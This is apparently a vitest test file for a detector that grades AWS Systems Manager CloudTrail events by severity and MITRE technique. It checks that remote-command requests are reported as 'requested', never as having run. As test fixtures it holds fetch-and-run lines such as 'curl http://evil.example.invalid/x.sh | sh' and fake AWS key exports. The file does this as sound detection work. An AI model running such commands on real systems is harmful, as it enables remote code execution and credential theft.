import { describe, it, expect } from "vitest";
import { decodeSsmCall, renderSsmDescription } from "../../src/analysis/ssmExecution.js";

// #931 item 7 — AWS Systems Manager remote execution. The phases stay distinct (listing documents
// is not running one), a request is "requested" never "ran", the payload is graded by the shared
// tables, and every request/session is its own row.

const SSM = "ssm.amazonaws.com";
const FAKE_AWS_KEY = ["AKIA", "EVIDENCEFORGEFAK"].join("");

const send = (
  documentName: string,
  extra: Record<string, unknown> = {},
  response: Record<string, unknown> = {},
) =>
  decodeSsmCall(
    SSM,
    "SendCommand",
    { documentName, instanceIds: ["i-0abc123def456789a"], ...extra },
    {
      command: { commandId: "cmd-1111", documentName, documentVersion: "3", status: "Pending", ...response },
    },
    "",
    "evt-1",
  );

describe("decodeSsmCall — phases", () => {
  it("ignores every other service and unknown SSM calls", () => {
    expect(decodeSsmCall("ec2.amazonaws.com", "SendCommand", {}, {}, "", "e")).toBeNull();
    expect(decodeSsmCall(SSM, "PutParameter", {}, {}, "", "e")).toBeNull();
  });

  it("discovery: listing what could be run is not running it", () => {
    for (const name of [
      "ListDocuments",
      "DescribeInstanceInformation",
      "GetCommandInvocation",
      "DescribeSessions",
    ]) {
      const d = decodeSsmCall(SSM, name, {}, {}, "", "e")!;
      expect(d.phase, name).toBe("discovery");
      expect(d.severity, name).toBe("Info");
      expect(d.mitre, name).toEqual(["T1526"]);
    }
  });

  it("request: SendCommand names the document, the resolved version, the target, the id and says 'requested'", () => {
    const d = send("AWS-RunShellScript", { parameters: { commands: ["whoami"] } })!;
    expect(d.phase).toBe("request");
    expect(d.severity).toBe("High");
    expect(d.mitre).toContain("T1651");
    expect(d.document).toBe("AWS-RunShellScript@3");
    expect(d.target).toBe("i-0abc123def456789a");
    expect(d.id).toBe("cmd-1111");
    expect(d.summary).toBe("[AWS-RunShellScript@3] cmd-1111 Pending: requested → i-0abc123def456789a");
    expect(d.summary).not.toMatch(/\bran\b|executed|completed/);
    expect(d.note).toContain("result is not in CloudTrail");
  });

  it("request: the payload is graded by the shared tables, in full, and shown as a bounded excerpt", () => {
    const d = send("AWS-RunShellScript", {
      parameters: {
        commands: ["curl http://evil.example.invalid/x.sh | sh", `export AWS_ACCESS_KEY_ID=${FAKE_AWS_KEY}`],
      },
    })!;
    expect(d.mitre).toEqual(expect.arrayContaining(["T1651", "T1552.001"]));
    expect(d.severity).toBe("High");
    expect(d.payloadExcerpt).toContain("curl http://evil.example.invalid/x.sh | sh");
    // a signal placed in the LAST of forty long commands is still graded
    const many = Array.from({ length: 40 }, () => "echo " + "a".repeat(2000));
    many.push(`export AWS_SECRET=${FAKE_AWS_KEY}`);
    const late = send("AWS-RunShellScript", { parameters: { commands: many } })!;
    expect(late.mitre).toContain("T1552.001");
    expect(late.payloadExcerpt.length).toBeLessThanOrEqual(270);
    expect(late.commandLine.length).toBeLessThanOrEqual(65_536);
    expect(late.note).toContain("payload clipped");
  });

  it("request: a control character in the payload is rendered as an escape", () => {
    const d = send("AWS-RunShellScript", { parameters: { commands: ["id\x00"] } })!;
    expect(d.payloadExcerpt).toContain("\\x00");
    expect(d.payloadExcerpt).not.toMatch(/\x00/);
  });

  it("request: targets by tag render and count; the display is bounded, the key is not", () => {
    const tags = { targets: [{ Key: "tag:Role", Values: ["web", "db"] }] };
    const d = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", ...tags },
      {},
      "",
      "e",
    )!;
    expect(d.target).toBe("tag:Role=web,db");
    const ids = Array.from({ length: 12 }, (_, i) => `i-${String(i).padStart(17, "0")}`);
    const many = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ids },
      {},
      "",
      "e",
    )!;
    expect(many.target).toContain("(+4 more)");
    const ninth = decodeSsmCall(
      SSM,
      "SendCommand",
      {
        documentName: "AWS-RunShellScript",
        instanceIds: [...ids.slice(0, 8), "i-99999999999999999", ...ids.slice(9)],
      },
      {},
      "",
      "e",
    )!;
    expect(ninth.keySegment).not.toBe(many.keySegment); // the ninth target is in the key
  });
});

describe("decodeSsmCall — fleet-management documents are Low only with safe parameters", () => {
  it("a routine patch scan is Low with the note", () => {
    const d = send("AWS-RunPatchBaseline", { parameters: { Operation: ["Scan"] } })!;
    expect(d.severity).toBe("Low");
    expect(d.mitre).toContain("T1651");
    expect(d.note).toContain("fleet-management document");
  });
  it("an override list, a downgrade, an unknown key or an unlisted document is High with the reason", () => {
    expect(
      send("AWS-RunPatchBaseline", {
        parameters: { Operation: ["Install"], InstallOverrideList: ["s3://x/list.yaml"] },
      })!.severity,
    ).toBe("High");
    expect(
      send("AWS-RunPatchBaseline", {
        parameters: { Operation: ["Install"], InstallOverrideList: ["s3://x/list.yaml"] },
      })!.note,
    ).toContain("overridden");
    const down = send("AWS-UpdateSSMAgent", {
      parameters: { allowDowngrade: ["true"], version: ["3.1.0.0"] },
    })!;
    expect(down.severity).toBe("High");
    expect(down.note).toContain("downgrade");
    expect(send("AWS-UpdateSSMAgent", { parameters: {} })!.severity).toBe("Low");
    // every schema key is matched case-insensitively — a camel-cased routine parameter stays Low
    expect(
      send("AWS-InstallWindowsUpdates", { parameters: { Action: ["Install"], PublishedDaysOld: ["10"] } })!
        .severity,
    ).toBe("Low");
    expect(
      send("AWS-GatherSoftwareInventory", { parameters: { applications: ["Enabled"], surprise: ["x"] } })!
        .severity,
    ).toBe("High");
    expect(send("AWS-RefreshAssociation", { parameters: { associationIds: ["a-1"] } })!.severity).toBe(
      "High",
    );
    expect(send("AWS-RefreshAssociation", { parameters: { associationIds: ["a-1"] } })!.note).toContain(
      "not in this record",
    );
    expect(send("Custom-DoThings", {})!.severity).toBe("High");
  });
});

describe("decodeSsmCall — sessions", () => {
  it("connection: StartSession names the target, the document and the session, and says the content is not logged", () => {
    const d = decodeSsmCall(
      SSM,
      "StartSession",
      { target: "i-0abc123def456789a" },
      { sessionId: "sess-1", streamUrl: "wss://x" },
      "",
      "e",
    )!;
    expect(d.phase).toBe("connection");
    expect(d.severity).toBe("High");
    expect(d.mitre).toEqual(["T1651"]);
    expect(d.document).toBe("SSM-SessionManagerRunShell");
    expect(d.id).toBe("sess-1");
    expect(d.note).toContain("not in CloudTrail");
    expect(d.summary).not.toContain("root");
  });
  it("connection: a port-forwarding session to a remote host names that host and is a tunnel", () => {
    const d = decodeSsmCall(
      SSM,
      "StartSession",
      {
        target: "i-0abc123def456789a",
        documentName: "AWS-StartPortForwardingSessionToRemoteHost",
        parameters: {
          host: ["db.example.invalid"],
          portNumber: ["3389"],
          localPortNumber: ["13389"],
        },
      },
      { sessionId: "sess-2" },
      "",
      "e",
    )!;
    expect(d.mitre).toEqual(expect.arrayContaining(["T1651", "T1572"]));
    expect(d.summary).toContain("→ db.example.invalid:3389");
    expect(d.note).toMatch(/tunnel/i);
    const other = decodeSsmCall(
      SSM,
      "StartSession",
      {
        target: "i-0abc123def456789a",
        documentName: "AWS-StartPortForwardingSessionToRemoteHost",
        parameters: { host: ["db.example.invalid"], portNumber: ["1433"] },
      },
      { sessionId: "sess-2" },
      "",
      "e",
    )!;
    expect(other.keySegment).not.toBe(d.keySegment); // a different port is a different session parameter set
  });
  it("connection: ResumeSession is a connection with the resume note; TerminateSession is lifecycle", () => {
    const r = decodeSsmCall(SSM, "ResumeSession", { sessionId: "sess-1" }, {}, "", "e")!;
    expect(r.phase).toBe("connection");
    expect(r.severity).toBe("High");
    expect(r.note).toMatch(/resumed/i);
    expect(r.id).toBe("sess-1");
    const t = decodeSsmCall(SSM, "TerminateSession", { sessionId: "sess-1" }, {}, "", "e")!;
    expect(t.phase).toBe("lifecycle");
    expect(t.severity).toBe("Info");
  });
});

describe("decodeSsmCall — code review regressions", () => {
  it("grades a suspicious suffix after character 4,000 and a pipe split across two entries", () => {
    const long = send("AWS-RunShellScript", {
      parameters: { commands: [`echo ${"a".repeat(4500)}; export AWS_KEY=${FAKE_AWS_KEY}`] },
    })!;
    expect(long.mitre).toContain("T1552.001");
    const split = send("AWS-RunShellScript", {
      parameters: { commands: ["curl http://evil.example.invalid/x.sh", "| sh"] },
    })!;
    expect(split.mitre).toEqual(expect.arrayContaining(["T1105", "T1059.004"])); // the joined reading fires
  });
  it("keeps a 96-character session id whole in the key and bounds only the display", () => {
    const a = "s".repeat(80) + "AAAAAAAAAAAAAAAA";
    const b = "s".repeat(80) + "BBBBBBBBBBBBBBBB";
    for (const name of ["StartSession", "ResumeSession", "TerminateSession"]) {
      const x = decodeSsmCall(SSM, name, { target: "i-1", sessionId: a }, { sessionId: a }, "", "e")!;
      const y = decodeSsmCall(SSM, name, { target: "i-1", sessionId: b }, { sessionId: b }, "", "e")!;
      expect(x.keySegment, name).not.toBe(y.keySegment);
      expect(x.summary.length, name).toBeLessThan(400);
    }
  });
  it("bounds a huge tag selector in the display and keeps the document, id and status ahead of it", () => {
    const targets = [
      { Key: "tag:Name", Values: Array.from({ length: 200 }, (_, i) => `host-${i}-${"x".repeat(30)}`) },
    ];
    const d = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", targets },
      { command: { commandId: "cmd-9", status: "Pending" } },
      "",
      "e",
    )!;
    expect(d.summary.startsWith("[AWS-RunShellScript] cmd-9 Pending: requested → ")).toBe(true);
    expect(d.summary.length).toBeLessThan(260);
  });
  it("a denied resume or termination never says it happened", () => {
    const r = decodeSsmCall(SSM, "ResumeSession", { sessionId: "s-1" }, {}, "AccessDenied", "e")!;
    expect(r.summary).toContain("attempted, denied");
    expect(r.summary).not.toMatch(/\bresumed\b/);
    expect(r.note).not.toContain("re-established");
    const t = decodeSsmCall(SSM, "TerminateSession", { sessionId: "s-1" }, {}, "AccessDenied", "e")!;
    expect(t.summary).toContain("attempted, denied");
    expect(t.summary).not.toMatch(/\bterminated\b/);
  });
});

describe("renderSsmDescription — the identity slot yields to the evidence", () => {
  it("a row whose SSM evidence fills 600 characters drops the identity rather than the payload, the error or the note", () => {
    const d = decodeSsmCall(
      SSM,
      "SendCommand",
      {
        documentName: "AWS-RunShellScript",
        instanceIds: Array.from({ length: 8 }, (_, i) => `i-0abc${i}${"x".repeat(12)}`),
        parameters: { commands: [`curl ${"u".repeat(200)} | sh`] },
      },
      { command: { commandId: "c".repeat(90), documentVersion: "3", status: "Pending" } },
      "",
      "evt",
    )!;
    const s = renderSsmDescription(d, {
      name: "SendCommand",
      source: "ssm",
      who: "w".repeat(60),
      from: "203.0.113.9",
      region: "us-east-1",
      client: "c".repeat(40),
      root: false,
      errorCode: "",
      identity: `AssumedRole key ASIAEXAMPLEKEY000001 (temporary) ${"z".repeat(200)}`,
    });
    expect(s.length).toBeLessThanOrEqual(600);
    expect(s).toContain('cmd: "curl');
    expect(s).toContain("Pending: requested");
    // The identity is what yields: whatever is left of it, the payload, the status and the
    // execution caveat stand.
    expect(s.indexOf('cmd: "curl')).toBeGreaterThan(0);
    // With the evidence filling the row, the identity takes nothing: the rendering is exactly the
    // identity-less one, caveat included.
    const withoutIdentity = renderSsmDescription(d, {
      name: "SendCommand",
      source: "ssm",
      who: "w".repeat(60),
      from: "203.0.113.9",
      region: "us-east-1",
      client: "c".repeat(40),
      root: false,
      errorCode: "",
    });
    expect(s).toBe(withoutIdentity);
  });
});

describe("renderSsmDescription — a maximal SendCommand keeps the full caveat", () => {
  for (const errorCode of ["", "AccessDenied"]) {
    it(`fifty targets, a long payload and a long identity never displace the note (${errorCode || "success"})`, () => {
      const d = decodeSsmCall(
        SSM,
        "SendCommand",
        {
          documentName: "AWS-RunShellScript",
          instanceIds: Array.from(
            { length: 50 },
            (_, i) => `i-0abc${String(i).padStart(3, "0")}${"x".repeat(10)}`,
          ),
          parameters: { commands: [`curl ${"u".repeat(300)} | sh`] },
        },
        { command: { commandId: "c".repeat(36), documentVersion: "3", status: "Pending" } },
        errorCode,
        "evt",
      )!;
      const parts = {
        name: "SendCommand",
        source: "ssm",
        who: "w".repeat(60),
        from: "2001:db8:0000:0000:0000:0000:0000:0001",
        region: "us-east-1",
        client: "c".repeat(40),
        root: false,
        errorCode,
      };
      for (const s of [
        renderSsmDescription(d, parts),
        renderSsmDescription(d, { ...parts, identity: `AssumedRole ${"z".repeat(200)}` }),
      ]) {
        expect(s.length).toBeLessThanOrEqual(600);
        expect(s.endsWith(` — ${d.note}`)).toBe(true);
        expect(s).toContain("[AWS-RunShellScript@3] cccccccccccccccccccccccccccccccccccc");
      }
    });
  }
});

describe("renderSsmDescription — a ResumeSession keeps its caveat under a long identity", () => {
  for (const errorCode of ["", "AccessDenied"]) {
    it(`the session-commands caveat survives with and without the identity (${errorCode || "success"})`, () => {
      const d = decodeSsmCall(SSM, "ResumeSession", { sessionId: "s".repeat(96) }, {}, errorCode, "evt")!;
      const parts = {
        name: "ResumeSession",
        source: "ssm",
        who: "w".repeat(60),
        from: "2001:db8:0000:0000:0000:0000:0000:0001",
        region: "us-east-1",
        client: "c".repeat(40),
        root: false,
        errorCode,
      };
      const withIdentity = renderSsmDescription(d, {
        ...parts,
        identity: `AssumedRole key ASIAEXAMPLEKEY000001 (temporary) ${"z".repeat(200)}`,
      });
      const without = renderSsmDescription(d, parts);
      expect(without).toContain("commands are not in CloudTrail");
      expect(withIdentity).toContain("commands are not in CloudTrail");
      expect(withIdentity.length).toBeLessThanOrEqual(600);
    });
  }
});

describe("decodeSsmCall — identity and errors", () => {
  it("keys every request and session on its own id; a denied call keys on the CloudTrail eventID", () => {
    const a = send("AWS-RunShellScript", {}, { commandId: "cmd-A" })!;
    const b = send("AWS-RunShellScript", {}, { commandId: "cmd-B" })!;
    expect(a.keySegment).not.toBe(b.keySegment);
    const d1 = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      {},
      "AccessDenied",
      "evt-1",
    )!;
    const d2 = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      {},
      "AccessDenied",
      "evt-2",
    )!;
    const d1again = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      {},
      "AccessDenied",
      "evt-1",
    )!;
    expect(d1.keySegment).not.toBe(d2.keySegment);
    expect(d1.keySegment).toBe(d1again.keySegment);
    expect(d1.note).toContain("denied");
  });
  it("a denied SendCommand says so in the summary even when a partial response echoes Pending", () => {
    const d = decodeSsmCall(
      SSM,
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      { command: { commandId: "cmd-1", status: "Pending" } },
      "AccessDenied",
      "evt-1",
    )!;
    expect(d.summary).toContain("attempted, denied");
    expect(d.summary).not.toContain("Pending");
    expect(d.summary).not.toContain("requested");
  });
  it("is safe on malformed shapes", () => {
    for (const [req, res] of [
      [null, null],
      ["junk", 5],
      [{ instanceIds: "i-1", parameters: "x" }, { command: "nope" }],
      [{ targets: [{}] }, {}],
    ] as const) {
      const d = decodeSsmCall(SSM, "SendCommand", req, res, "", "e");
      expect(d, JSON.stringify(req)).not.toBeNull();
      expect(d!.summary).not.toContain("undefined");
    }
  });
});
